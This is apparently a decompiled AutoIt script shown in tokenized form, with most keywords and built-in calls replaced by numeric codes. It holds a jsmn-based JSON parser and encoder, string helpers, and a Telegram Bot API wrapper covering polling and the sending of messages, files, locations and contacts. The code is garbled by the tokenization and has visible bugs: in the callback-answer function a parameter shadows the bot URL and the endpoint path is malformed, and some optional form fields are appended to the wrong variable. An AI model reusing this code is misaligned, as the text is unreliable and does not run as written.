28$PARSER=65("uint pos;int toknext;int toksuper")
11
59("none:cdecl",$JSMN_INIT,"ptr",67($PARSER))
$TOKENLIST=65("byte["&($INITTOKENCOUNT*20)&"]")
$RET=59("int:cdecl",$JSMN_PARSE,"ptr",67($PARSER),"wstr",$JSON,"ptr",67($TOKENLIST),"uint",$INITTOKENCOUNT)
$INITTOKENCOUNT*=2
12$RET[0]<>$JSMN_ERROR_NOMEM
28$NEXT=0
34287($RET[0],0,_JSON_TOKEN($JSON,67($TOKENLIST),$NEXT))
33
32_JSON_TOKEN(36$JSON,$PTR,36$NEXT)
4$NEXT=-153442
28$TOKEN=65("int;int;int;int",$PTR+($NEXT*20))
28$TYPE=66($TOKEN,1)
28$START=66($TOKEN,2)
28$END=66($TOKEN,3)
28$SIZE=66($TOKEN,4)
$NEXT+=1
4$TYPE=01$START=01$END=01$SIZE=05
$NEXT=-1
3442
8
23$TYPE
210
28$PRIMITIVE=325($JSON,$START+1,$END-$START)
23$PRIMITIVE
21"true"
3439
21"false"
3440
21"null"
3442
216
4326($PRIMITIVE,"^[+\-0-9]")5
34250($PRIMITIVE)
6
34JSON_STRINGDECODE($PRIMITIVE)
8
24
211
28$OBJECT=JSON_OBJCREATE()
13$I=015$SIZE-1162
28$KEY=_JSON_TOKEN($JSON,$PTR,$NEXT)
28$VALUE=_JSON_TOKEN($JSON,$PTR,$NEXT)
43233($KEY)5$KEY=JSON_ENCODE($KEY)
4$OBJECT.Exists($KEY)5$OBJECT.Remove($KEY)
$OBJECT.Add($KEY,$VALUE)
14
34$OBJECT
212
28$ARRAY[$SIZE]
13$I=015$SIZE-1
$ARRAY[$I]=_JSON_TOKEN($JSON,$PTR,$NEXT)
14
34$ARRAY
213
34JSON_STRINGDECODE(325($JSON,$START+1,$END-$START))
24
33
32JSON_ISOBJECT(36$OBJECT)
34(231($OBJECT)1255($OBJECT)="Dictionary")
33
32JSON_ISNULL(36$NULL)
34228($NULL)2(3231($NULL)1377($NULL)="Object")
33
32JSON_ENCODE_COMPACT($DATA,$OPTION=0)
20
21233($DATA)
34'"'&JSON_STRINGENCODE($DATA,$OPTION)&'"'
21230($DATA)
34$DATA
21219($DATA)1369($DATA,0)=1
28$JSON="["
13$I=015369($DATA)-1
$JSON&=JSON_ENCODE_COMPACT($DATA[$I],$OPTION)&","
14
4330($JSON,1)=","5$JSON=337($JSON,1)
34$JSON&"]"
21JSON_ISOBJECT($DATA)
28$JSON="{"
28$KEYS=$DATA.Keys()
13$I=015369($KEYS)-1
$JSON&='"'&JSON_STRINGENCODE($KEYS[$I],$OPTION)&'":'&JSON_ENCODE_COMPACT($DATA.Item($KEYS[$I]),$OPTION)&","
14
4330($JSON,1)=","5$JSON=337($JSON,1)
34$JSON&"}"
21221($DATA)
34324($DATA)
21232($DATA)
34250($DATA)
21220($DATA)
34'"'&JSON_STRINGENCODE(16($DATA,4),$OPTION)&'"'
216
34"null"
22
33
32JSON_ENCODE_PRETTY($DATA,$OPTION,$INDENT,$ARRAYSEP,$OBJECTSEP,$COLONSEP,$ARRAYCRLF=41,$OBJECTCRLF=41,$NEXTIDENT="")
28$THISIDENT=$NEXTIDENT,$JSON=""
20
21233($DATA)
28$STRING=JSON_STRINGENCODE($DATA,$OPTION)
417($OPTION,$JSON_UNQUOTED_STRING)1317($OPTION,$JSON_STRICT_PRINT)13326($STRING,"[\s,:]")13326($STRING,"^[+\-0-9]")5
34$STRING
6
34'"'&$STRING&'"'
8
21219($DATA)1369($DATA,0)=1
4369($DATA)=0534"[]"
4228($ARRAYCRLF)5
$ARRAYCRLF=""
28$MATCH=326($ARRAYSEP,"[\r\n]+$",3)
4219($MATCH)5$ARRAYCRLF=$MATCH[0]
8
4$ARRAYCRLF5$NEXTIDENT&=$INDENT
28$LENGTH=369($DATA)-1
13$I=015$LENGTH
4$ARRAYCRLF5$JSON&=$NEXTIDENT
$JSON&=JSON_ENCODE_PRETTY($DATA[$I],$OPTION,$INDENT,$ARRAYSEP,$OBJECTSEP,$COLONSEP,$ARRAYCRLF,$OBJECTCRLF,$NEXTIDENT)
4$I<$LENGTH5$JSON&=$ARRAYSEP
14
4$ARRAYCRLF534"["&$ARRAYCRLF&$JSON&$ARRAYCRLF&$THISIDENT&"]"
34"["&$JSON&"]"
21JSON_ISOBJECT($DATA)
4$DATA.Count=0534"{}"
4228($OBJECTCRLF)5
$OBJECTCRLF=""
28$MATCH=326($OBJECTSEP,"[\r\n]+$",3)
4219($MATCH)5$OBJECTCRLF=$MATCH[0]
8
4$OBJECTCRLF5$NEXTIDENT&=$INDENT
28$KEYS=$DATA.Keys()
28$LENGTH=369($KEYS)-1
13$I=015$LENGTH
4$OBJECTCRLF5$JSON&=$NEXTIDENT
$JSON&=JSON_ENCODE_PRETTY(306($KEYS[$I]),$OPTION,$INDENT,$ARRAYSEP,$OBJECTSEP,$COLONSEP)&$COLONSEP&JSON_ENCODE_PRETTY($DATA.Item($KEYS[$I]),$OPTION,$INDENT,$ARRAYSEP,$OBJECTSEP,$COLONSEP,$ARRAYCRLF,$OBJECTCRLF,$NEXTIDENT)
4$I<$LENGTH5$JSON&=$OBJECTSEP
14
4$OBJECTCRLF534"{"&$OBJECTCRLF&$JSON&$OBJECTCRLF&$THISIDENT&"}"
34"{"&$JSON&"}"
216
34JSON_ENCODE_COMPACT($DATA,$OPTION)
22
33
32JSON_ENCODE($DATA,$OPTION=0,$INDENT=41,$ARRAYSEP=41,$OBJECTSEP=41,$COLONSEP=41)
417($OPTION,$JSON_PRETTY_PRINT)5
28$STRICT=17($OPTION,$JSON_STRICT_PRINT)
4228($INDENT)5
$INDENT=@TAB
6
$INDENT=JSON_STRINGDECODE($INDENT)
4326($INDENT,"[^\t ]")5$INDENT=@TAB
8
4228($ARRAYSEP)5
$ARRAYSEP=","&@CRLF
6
$ARRAYSEP=JSON_STRINGDECODE($ARRAYSEP)
4$ARRAYSEP=""2326($ARRAYSEP,"[^\s,]|,.*,")2($STRICT13326($ARRAYSEP,","))5$ARRAYSEP=","&@CRLF
8
4228($OBJECTSEP)5
$OBJECTSEP=","&@CRLF
6
$OBJECTSEP=JSON_STRINGDECODE($OBJECTSEP)
4$OBJECTSEP=""2326($OBJECTSEP,"[^\s,]|,.*,")2($STRICT13326($OBJECTSEP,","))5$OBJECTSEP=","&@CRLF
8
4228($COLONSEP)5
$COLONSEP=": "
6
$COLONSEP=JSON_STRINGDECODE($COLONSEP)
4$COLONSEP=""2326($COLONSEP,"[^\s,:]|[,:].*[,:]")2($STRICT1(326($COLONSEP,",")23326($COLONSEP,":")))5$COLONSEP=": "
8
34JSON_ENCODE_PRETTY($DATA,$OPTION,$INDENT,$ARRAYSEP,$OBJECTSEP,$COLONSEP)
717($OPTION,$JSON_UNQUOTED_STRING)5
34JSON_ENCODE_PRETTY($DATA,$OPTION,"",",",",",":")
6
34JSON_ENCODE_COMPACT($DATA,$OPTION)
8
33
32JSON_OBJCREATE()
28$OBJECT=251("Scripting.Dictionary")
$OBJECT.CompareMode=0
34$OBJECT
33
32JSON_OBJPUT(36$OBJECT,$KEY,$VALUE)
$KEY=306($KEY)
4$OBJECT.Exists($KEY)5$OBJECT.Remove($KEY)
$OBJECT.Add($KEY,$VALUE)
33
32JSON_OBJGET(36$OBJECT,$KEY)
$KEY=306($KEY)
4$OBJECT.Exists($KEY)534$OBJECT.Item($KEY)
34287(1,0,"")
33
32JSON_OBJDELETE(36$OBJECT,$KEY)
$KEY=306($KEY)
4$OBJECT.Exists($KEY)5$OBJECT.Remove($KEY)
33
32JSON_OBJEXISTS(36$OBJECT,$KEY)
34$OBJECT.Exists(306($KEY))
33
32JSON_OBJGETCOUNT(36$OBJECT)
34$OBJECT.Count
33
32JSON_OBJGETKEYS(36$OBJECT)
34$OBJECT.Keys()
33
32JSON_OBJCLEAR(36$OBJECT)
34$OBJECT.RemoveAll()
33
32JSON_PUT(36$VAR,$NOTATION,$DATA,$CHECKEXISTS=40)
28$MATCH=326($NOTATION,"(^\[([^\]]+)\])|(^\.([^\.\[]+))",3)
4219($MATCH)5
28$INDEX
4369($MATCH)=45
$INDEX=306(JSON_DECODE($MATCH[3]))
$NOTATION=336($NOTATION,323($MATCH[2]))
6
$INDEX=JSON_DECODE($MATCH[1])
$NOTATION=336($NOTATION,323($MATCH[0]))
8
4233($INDEX)5
4$CHECKEXISTS1(3JSON_ISOBJECT($VAR)23JSON_OBJEXISTS($VAR,$INDEX))5
34287(1,0,40)
8
43JSON_ISOBJECT($VAR)5$VAR=JSON_OBJCREATE()
4$NOTATION5
28$ITEM=JSON_OBJGET($VAR,$INDEX)
28$RET=JSON_PUT($ITEM,$NOTATION,$DATA,$CHECKEXISTS)
28$ERROR=@ERROR
43$ERROR5JSON_OBJPUT($VAR,$INDEX,$ITEM)
34287($ERROR,0,$RET)
6
JSON_OBJPUT($VAR,$INDEX,$DATA)
3439
8
7227($INDEX)5
4$INDEX<02($CHECKEXISTS1(3219($VAR)2369($VAR,0)<>12$INDEX>=369($VAR)))5
34287(1,0,40)
8
43219($VAR)2369($VAR,0)<>15
26$VAR[$INDEX+1]
7$INDEX>=369($VAR)5
27$VAR[$INDEX+1]
8
4$NOTATION5
28$RET=JSON_PUT($VAR[$INDEX],$NOTATION,$DATA,$CHECKEXISTS)
34287(@ERROR,0,$RET)
6
$VAR[$INDEX]=$DATA
3439
8
8
8
34287(2,0,40)
33
32JSON_GET(36$VAR,$NOTATION)
28$MATCH=326($NOTATION,"(^\[([^\]]+)\])|(^\.([^\.\[]+))",3)
4219($MATCH)5
28$INDEX
4369($MATCH)=45
$INDEX=306(JSON_DECODE($MATCH[3]))
$NOTATION=336($NOTATION,323($MATCH[2]))
6
$INDEX=JSON_DECODE($MATCH[1])
$NOTATION=336($NOTATION,323($MATCH[0]))
8
28$ITEM
4233($INDEX)1JSON_ISOBJECT($VAR)1JSON_OBJEXISTS($VAR,$INDEX)5
$ITEM=JSON_OBJGET($VAR,$INDEX)
7227($INDEX)1219($VAR)1369($VAR,0)=11$INDEX>=01$INDEX<369($VAR)5
$ITEM=$VAR[$INDEX]
6
34287(1,0,"")
8
43$NOTATION534$ITEM
28$RET=JSON_GET($ITEM,$NOTATION)
34287(@ERROR,0,$RET)
8
34287(2,0,"")
33
32_HEXTOSTRING($SHEX)
43(322($SHEX,2)=="0x")5$SHEX="0x"&$SHEX
3416($SHEX,$SB_UTF8)
33
32_STRINGBETWEEN($SSTRING,$SSTART,$SEND,$IMODE=$STR_ENDISSTART,$BCASE=40)
$SSTART=$SSTART"\Q"&$SSTART&"\E""\A"
4$IMODE<>$STR_ENDNOTSTART5$IMODE=$STR_ENDISSTART
4$IMODE=$STR_ENDISSTART5
$SEND=$SEND"(?=\Q"&$SEND&"\E)""\z"
6
$SEND=$SEND"\Q"&$SEND&"\E""\z"
8
4$BCASE=415
$BCASE=40
8
28$ARETURN=326($SSTRING,"(?s"&(3$BCASE"i""")&")"&$SSTART&"(.*?)"&$SEND,$STR_REGEXPARRAYGLOBALMATCH)
4@ERROR534287(1,0,0)
34$ARETURN
33
32_STRINGEXPLODE($SSTRING,$SDELIMITER,$ILIMIT=0)
4$ILIMIT=415$ILIMIT=0
4$ILIMIT>05
2830$NULL=28(0)
$SSTRING=328($SSTRING,$SDELIMITER,$NULL,$ILIMIT)
$SDELIMITER=$NULL
7$ILIMIT<05
28$IINDEX=311($SSTRING,$SDELIMITER,$STR_NOCASESENSEBASIC,$ILIMIT)
4$IINDEX5
$SSTRING=322($SSTRING,$IINDEX-1)
8
8
34331($SSTRING,$SDELIMITER,19($STR_ENTIRESPLIT,$STR_NOCOUNT))
33
32_STRINGINSERT($SSTRING,$SINSERTION,$IPOSITION)
28$ILENGTH=323($SSTRING)
$IPOSITION=217($IPOSITION)
4$IPOSITION<05$IPOSITION=$ILENGTH+$IPOSITION
4$ILENGTH<$IPOSITION2$IPOSITION<0534287(1,0,$SSTRING)
34322($SSTRING,$IPOSITION)&$SINSERTION&330($SSTRING,$ILENGTH-$IPOSITION)
33
32_STRINGPROPER($SSTRING)
28$BCAPNEXT=39,$SCHR="",$SRETURN=""
13$I=115323($SSTRING)
$SCHR=325($SSTRING,$I,1)
20
21$BCAPNEXT=39
4326($SCHR,"[a-zA-ZА-яљњћџ]")5
$SCHR=338($SCHR)
$BCAPNEXT=40
8
213326($SCHR,"[a-zA-ZА-яљњћџ]")
$BCAPNEXT=39
216
$SCHR=324($SCHR)
22
$SRETURN&=$SCHR
14
34$SRETURN
33
32_STRINGREPEAT($SSTRING,$IREPEATCOUNT)
$IREPEATCOUNT=217($IREPEATCOUNT)
4$IREPEATCOUNT=0534""
4323($SSTRING)<12$IREPEATCOUNT<0534287(1,0,"")
28$SRESULT=""
9$IREPEATCOUNT>1
417($IREPEATCOUNT,1)5$SRESULT&=$SSTRING
$SSTRING&=$SSTRING
$IREPEATCOUNT=21($IREPEATCOUNT,1)
10
34$SSTRING&$SRESULT
33
32_STRINGTITLECASE($SSTRING)
28$BCAPNEXT=39,$SCHR="",$SRETURN=""
13$I=115323($SSTRING)
$SCHR=325($SSTRING,$I,1)
20
21$BCAPNEXT=39
4326($SCHR,"[a-zA-Z\xC0-\xFF0-9]")5
$SCHR=338($SCHR)
$BCAPNEXT=40
8
213326($SCHR,"[a-zA-Z\xC0-\xFF'0-9]")
$BCAPNEXT=39
216
$SCHR=324($SCHR)
22
$SRETURN&=$SCHR
14
34$SRETURN
33
32_STRINGTOHEX($SSTRING)
34199(335($SSTRING,$SB_UTF8))
33
30$BOT_CRLF=__URLENCODE(@CRLF)
29$OFFSET=0
29$URL="https://api.telegram.org/bot"
32_INITBOT($TOKEN)
$TOKEN=$TOKEN
$URL&=$TOKEN
43219(_GETME())5
33("Ops! Error: reason may be invalid token, webhook active, internet connection..."&@CRLF)
351
6
3439
8
33
32_GETUPDATES()
34__HTTPGET($URL&"/getUpdates?offset="&$OFFSET)
33
32_GETME()
28$JSON=JSON_DECODE(__HTTPGET($URL&"/getMe"))
43(JSON_ISOBJECT($JSON))534287(1,0,40)
28$DATA[3]=[JSON_GET($JSON,"[result][id]"),JSON_GET($JSON,"[result][username]"),JSON_GET($JSON,"[result][first_name]")]
34$DATA
33
32_POLLING()
91
293(1000)
$NEWUPDATES=_GETUPDATES()
33($NEWUPDATES&@CRLF)
43311($NEWUPDATES,"update_id")519
$MSGDATA=__MSGDECODE($NEWUPDATES)
$OFFSET=$MSGDATA[0]+1
33(_ARRAYTOSTRING($MSGDATA)&@CRLF)
34$MSGDATA
10
33
32_CREATEKEYBOARD(36$KEYBOARD,$RESIZE=40,$ONETIME=40)
28$JSONKEYBOARD='{"keyboard":['
13$I=015369($KEYBOARD)-1
4($KEYBOARD[$I]<>"")5
4(330($JSONKEYBOARD,1)='"')5
$JSONKEYBOARD&=',"'&$KEYBOARD[$I]&'"'
6
$JSONKEYBOARD&='["'&$KEYBOARD[$I]&'"'
8
6
$JSONKEYBOARD&="],"
8
14
$JSONKEYBOARD&="]]"
4$RESIZE=395$JSONKEYBOARD&=',"resize_keyboard":true'
4$ONETIME=395$JSONKEYBOARD&=',"one_time_keyboard":true'
$JSONKEYBOARD&="}"
34$JSONKEYBOARD
33
32_CREATEINLINEKEYBOARD(36$KEYBOARD)
28$JSONKEYBOARD='{"inline_keyboard":[['
13$I=015369($KEYBOARD)-1
4($KEYBOARD[$I]<>"")5
4(330($JSONKEYBOARD,2)="[[")5
$JSONKEYBOARD&='{"text":"'&$KEYBOARD[$I]&'",'
7(330($JSONKEYBOARD,2)='",')5
$JSONKEYBOARD&='"callback_data":"'&$KEYBOARD[$I]&'"}'
7(330($JSONKEYBOARD,2)='"}')5
$JSONKEYBOARD&=',{"text":"'&$KEYBOARD[$I]&'",'
7(330($JSONKEYBOARD,2)="},")5
$JSONKEYBOARD&='{"text":"'&$KEYBOARD[$I]&'",'
8
6
$JSONKEYBOARD&="},"
8
14
$JSONKEYBOARD&="]]}"
34$JSONKEYBOARD
33
32_SENDMSG($CHATID,$TEXT,$PARSEMODE=41,$REPLYMARKUP=41,$REPLYTOMESSAGE="",$DISABLEWEBPREVIEW=40,$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/sendMessage?chat_id="&$CHATID&"&text="&$TEXT
4324($PARSEMODE)="markdown"5$QUERY&="&parse_mode=markdown"
4324($PARSEMODE)="html"5$QUERY&="&parse_mode=html"
4$DISABLEWEBPREVIEW=395$QUERY&="&disable_web_page_preview=True"
4$DISABLENOTIFICATION=395$QUERY&="&disable_notification=True"
4$REPLYTOMESSAGE<>""5$QUERY&="&reply_to_message_id="&$REPLYTOMESSAGE
4$REPLYMARKUP<>415$QUERY&="&reply_markup="&$REPLYMARKUP
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(1,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
34JSON_GET($JSON,"[result][message_id]")
33
32_FORWARDMSG($CHATID,$ORIGINALCHATID,$MSGID,$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/forwardMessage?chat_id="&$CHATID&"&from_chat_id="&$ORIGINALCHATID&"&message_id="&$MSGID
4$DISABLENOTIFICATION5$QUERY&="&disable_notification=True"
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(1,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
34JSON_GET($JSON,"[result][message_id]")
33
32_SENDPHOTO($CHATID,$PATH,$CAPTION="",$REPLYMARKUP=41,$REPLYTOMESSAGE="",$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/sendPhoto"
28$HOPEN=_WINHTTPOPEN()
28$FORM='<form action="'&$QUERY&'" method="post" enctype="multipart/form-data">'&'<input type="text" name="chat_id"/>'&'<input type="file" name="photo"/>'&'<input type="text" name="caption"/>'
4$REPLYMARKUP<>415$FORM&='<input type="text" name="reply_markup"/>'
4$REPLYTOMESSAGE<>""5$QUERY&='<input type="text" name="reply_to_message_id"/>'
4$DISABLENOTIFICATION5$FORM&='<input type="text" name="disable_notification"/>'
$FORM&="</form>"
28$RESPONSE=_WINHTTPSIMPLEFORMFILL($FORM,$HOPEN,41,"name:chat_id",$CHATID,"name:photo",$PATH,"name:caption",$CAPTION,"name:reply_markup",$REPLYMARKUP,"name:reply_to_message_id",$REPLYTOMESSAGE,"name:disable_notification",$DISABLENOTIFICATION)
_WINHTTPCLOSEHANDLE($HOPEN)
28$JSON=JSON_DECODE($RESPONSE)
43(JSON_ISOBJECT($JSON))534287(2,0,40)
34__GETFILEID($JSON,"photo")
33
32_SENDVIDEO($CHATID,$PATH,$CAPTION="",$REPLYMARKUP=41,$REPLYTOMESSAGE="",$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/sendVideo"
28$HOPEN=_WINHTTPOPEN("",$WINHTTP_ACCESS_TYPE_NAMED_PROXY,$SPROXY)
28$FORM='<form action="'&$QUERY&'" method="post" enctype="multipart/form-data">'&'<input type="text" name="chat_id"/>'&'<input type="file" name="video"/>'&'<input type="text" name="caption"/>'
4$REPLYMARKUP<>415$FORM&=' <input type="text" name="reply_markup"/>'
4$REPLYTOMESSAGE<>""5$QUERY&='<input type="text" name="reply_to_message_id"/>'
4$DISABLENOTIFICATION5$FORM&=' <input type="text" name="disable_notification"/>'
$FORM&="</form>"
28$RESPONSE=_WINHTTPSIMPLEFORMFILL($FORM,$HOPEN,41,"name:chat_id",$CHATID,"name:video",$PATH,"name:caption",$CAPTION,"name:reply_markup",$REPLYMARKUP,"name:reply_to_message_id",$REPLYTOMESSAGE,"name:disable_notification",$DISABLENOTIFICATION)
_WINHTTPCLOSEHANDLE($HOPEN)
28$JSON=JSON_DECODE($RESPONSE)
43(JSON_ISOBJECT($JSON))534287(2,0,40)
34__GETFILEID($JSON,"video")
33
32_SENDAUDIO($CHATID,$PATH,$CAPTION="",$REPLYMARKUP=41,$REPLYTOMESSAGE="",$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/sendAudio"
28$HOPEN=_WINHTTPOPEN("",$WINHTTP_ACCESS_TYPE_NAMED_PROXY,$SPROXY)
28$FORM='<form action="'&$QUERY&'" method="post" enctype="multipart/form-data">'&'<input type="text" name="chat_id"/>'&'<input type="file" name="audio"/>'&'<input type="text" name="caption"/>'
4$REPLYMARKUP<>415$FORM&=' <input type="text" name="reply_markup"/>'
4$REPLYTOMESSAGE<>""5$QUERY&='<input type="text" name="reply_to_message_id"/>'
4$DISABLENOTIFICATION5$FORM&=' <input type="text" name="disable_notification"/>'
$FORM&="</form>"
28$RESPONSE=_WINHTTPSIMPLEFORMFILL($FORM,$HOPEN,41,"name:chat_id",$CHATID,"name:audio",$PATH,"name:caption",$CAPTION,"name:reply_markup",$REPLYMARKUP,"name:reply_to_message_id",$REPLYTOMESSAGE,"name:disable_notification",$DISABLENOTIFICATION)
_WINHTTPCLOSEHANDLE($HOPEN)
28$JSON=JSON_DECODE($RESPONSE)
43(JSON_ISOBJECT($JSON))534287(2,0,40)
34__GETFILEID($JSON,"audio")
33
32_SENDDOCUMENT($CHATID,$PATH,$CAPTION="",$REPLYMARKUP=41,$REPLYTOMESSAGE="",$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/sendDocument"
28$HOPEN=_WINHTTPOPEN("",$WINHTTP_ACCESS_TYPE_NAMED_PROXY,$SPROXY)
28$FORM='<form action="'&$QUERY&'" method="post" enctype="multipart/form-data">'&'<input type="text" name="chat_id"/>'&'<input type="file" name="document"/>'&'<input type="text" name="caption"/>'
4$REPLYMARKUP<>415$FORM&=' <input type="text" name="reply_markup"/>'
4$REPLYTOMESSAGE<>""5$QUERY&='<input type="text" name="reply_to_message_id"/>'
4$DISABLENOTIFICATION5$FORM&=' <input type="text" name="disable_notification"/>'
$FORM&="</form>"
28$RESPONSE=_WINHTTPSIMPLEFORMFILL($FORM,$HOPEN,41,"name:chat_id",$CHATID,"name:document",$PATH,"name:caption",$CAPTION,"name:reply_markup",$REPLYMARKUP,"name:reply_to_message_id",$REPLYTOMESSAGE,"name:disable_notification",$DISABLENOTIFICATION)
_WINHTTPCLOSEHANDLE($HOPEN)
28$JSON=JSON_DECODE($RESPONSE)
43(JSON_ISOBJECT($JSON))534287(2,0,40)
34__GETFILEID($JSON,"document")
33
32_SENDVOICE($CHATID,$PATH,$CAPTION="",$REPLYMARKUP=41,$REPLYTOMESSAGE="",$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/sendVoice"
28$HOPEN=_WINHTTPOPEN("",$WINHTTP_ACCESS_TYPE_NAMED_PROXY,$SPROXY)
28$FORM='<form action="'&$QUERY&'" method="post" enctype="multipart/form-data">'&'<input type="text" name="chat_id"/>'&'<input type="file" name="voice"/>'&'<input type="text" name="caption"/>'
4$REPLYMARKUP<>415$FORM&=' <input type="text" name="reply_markup"/>'
4$REPLYTOMESSAGE<>""5$QUERY&='<input type="text" name="reply_to_message_id"/>'
4$DISABLENOTIFICATION5$FORM&=' <input type="text" name="disable_notification"/>'
$FORM&="</form>"
28$RESPONSE=_WINHTTPSIMPLEFORMFILL($FORM,$HOPEN,41,"name:chat_id",$CHATID,"name:voice",$PATH,"name:caption",$CAPTION,"name:reply_markup",$REPLYMARKUP,"name:reply_to_message_id",$REPLYTOMESSAGE,"name:disable_notification",$DISABLENOTIFICATION)
_WINHTTPCLOSEHANDLE($HOPEN)
28$JSON=JSON_DECODE($RESPONSE)
43(JSON_ISOBJECT($JSON))534287(2,0,40)
34__GETFILEID($JSON,"voice")
33
32_SENDSTICKER($CHATID,$PATH,$REPLYMARKUP=41,$REPLYTOMESSAGE="",$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/sendSticker"
28$HOPEN=_WINHTTPOPEN("",$WINHTTP_ACCESS_TYPE_NAMED_PROXY,$SPROXY)
28$FORM='<form action="'&$QUERY&'" method="post" enctype="multipart/form-data">'&'<input type="text" name="chat_id"/>'&'<input type="file" name="sticker"/>'
4$REPLYMARKUP<>415$FORM&=' <input type="text" name="reply_markup"/>'
4$REPLYTOMESSAGE<>""5$QUERY&='<input type="text" name="reply_to_message_id"/>'
4$DISABLENOTIFICATION5$FORM&=' <input type="text" name="disable_notification"/>'
$FORM&="</form>"
28$RESPONSE=_WINHTTPSIMPLEFORMFILL($FORM,$HOPEN,41,"name:chat_id",$CHATID,"name:sticker",$PATH,"name:reply_markup",$REPLYMARKUP,"name:reply_to_message_id",$REPLYTOMESSAGE,"name:disable_notification",$DISABLENOTIFICATION)
_WINHTTPCLOSEHANDLE($HOPEN)
28$JSON=JSON_DECODE($RESPONSE)
43(JSON_ISOBJECT($JSON))534287(2,0,40)
34__GETFILEID($JSON,"sticker")
33
32_SENDVENUE($CHATID,$LATITUDE,$LONGITUDE,$TITLE,$ADDRESS,$FOURSQUARE="",$REPLYMARKUP=41,$REPLYTOMESSAGE="",$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/sendVenue?chat_id="&$CHATID&"&latitude="&$LATITUDE&"&longitude="&$LONGITUDE&"&title="&$TITLE&"&address="&$ADDRESS
4$FOURSQUARE<>""5$QUERY&="&foursquare="&$FOURSQUARE
4$REPLYMARKUP<>415$QUERY&="&reply_markup="&$REPLYMARKUP
4$REPLYTOMESSAGE<>""5$QUERY&="&reply_to_message_id="&$REPLYTOMESSAGE
4$DISABLENOTIFICATION5$QUERY&="&disable_notification=true"
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_SENDVIDEONOTE($CHATID,$PATH,$REPLYMARKUP=41,$REPLYTOMESSAGE="",$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/sendVideoNote"
28$HOPEN=_WINHTTPOPEN("",$WINHTTP_ACCESS_TYPE_NAMED_PROXY,$SPROXY)
28$FORM='<form action="'&$QUERY&'" method="post" enctype="multipart/form-data">'&'<input type="text" name="chat_id"/>'&'<input type="file" name="video_note"/>'
4$REPLYMARKUP<>415$FORM&=' <input type="text" name="reply_markup"/>'
4$REPLYTOMESSAGE<>""5$QUERY&='<input type="text" name="reply_to_message_id"/>'
4$DISABLENOTIFICATION5$FORM&=' <input type="text" name="disable_notification"/>'
$FORM&="</form>"
28$RESPONSE=_WINHTTPSIMPLEFORMFILL($FORM,$HOPEN,41,"name:chat_id",$CHATID,"name:video_note",$PATH,"name:reply_markup",$REPLYMARKUP,"name:reply_to_message_id",$REPLYTOMESSAGE,"name:disable_notification",$DISABLENOTIFICATION)
_WINHTTPCLOSEHANDLE($HOPEN)
28$JSON=JSON_DECODE($RESPONSE)
43(JSON_ISOBJECT($JSON))534287(2,0,40)
34__GETFILEID($JSON,"videonote")
33
32_SENDCHATACTION($CHATID,$ACTION)
28$QUERY=$URL&"/sendChatAction?chat_id="&$CHATID&"&action="&$ACTION
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_SENDLOCATION($CHATID,$LATITUDE,$LONGITUDE,$LIVEPERIOD="",$REPLYMARKUP=41,$REPLYTOMESSAGE="",$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/sendLocation?chat_id="&$CHATID&"&latitude="&$LATITUDE&"&longitude="&$LONGITUDE
4$LIVEPERIOD<>""5$QUERY&="&live_period="&$LIVEPERIOD
4$REPLYMARKUP<>415$QUERY&="&reply_markup="&$REPLYMARKUP
4$REPLYTOMESSAGE<>""5$QUERY&="&reply_to_message_id="&$REPLYTOMESSAGE
4$DISABLENOTIFICATION5$QUERY&="&disable_notification=true"
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_SENDCONTACT($CHATID,$PHONE,$FIRSTNAME,$LASTNAME="",$REPLYMARKUP=41,$REPLYTOMESSAGE="",$DISABLENOTIFICATION=40)
28$QUERY=$URL&"/sendContact?chat_id="&$CHATID&"&phone_number="&$PHONE&"&first_name="&$FIRSTNAME
4$LASTNAME<>""5$QUERY&="&last_name="&$LASTNAME
4$REPLYMARKUP<>415$QUERY&="&reply_markup="&$REPLYMARKUP
4$REPLYTOMESSAGE<>""5$QUERY&="&reply_to_message_id="&$REPLYTOMESSAGE
4$DISABLENOTIFICATION=395$QUERY&="&disable_notification=True"
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_ANSWERCALLBACKQUERY($CALLBACKID,$TEXT="",$URL="",$SHOWALERT=40,$CACHETIME="")
28$QUERY=$URL&"/_answerCallbackQuery?callback_query_id="&$CALLBACKID
4$TEXT<>""5$QUERY&="&text="&$TEXT
4$URL<>""5$QUERY&="&url="&$URL
4$SHOWALERT5$QUERY&="&show_alert=true"
4$CACHETIME<>""5$QUERY&="&cache_time="&$CACHETIME
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
43(JSON_GET($JSON,"[ok]")="true")534287(2,0,40)
3439
33
32_EDITMESSAGELIVELOCATION($CHATID,$LATITUDE,$LONGITUDE,$REPLYMARKUP=41)
$QUERY=$URL&"/editMessageLiveLocation?chat_id="&$CHATID&"&latitude="&$LATITUDE&"&longitude="&$LONGITUDE
4$REPLYMARKUP<>415$QUERY&="&reply_markup="&$REPLYMARKUP
28$JSON=JSON_DECODE(__HTTPPOST($QUERY))
43(JSON_ISOBJECT($JSON))534287(2,0,40)
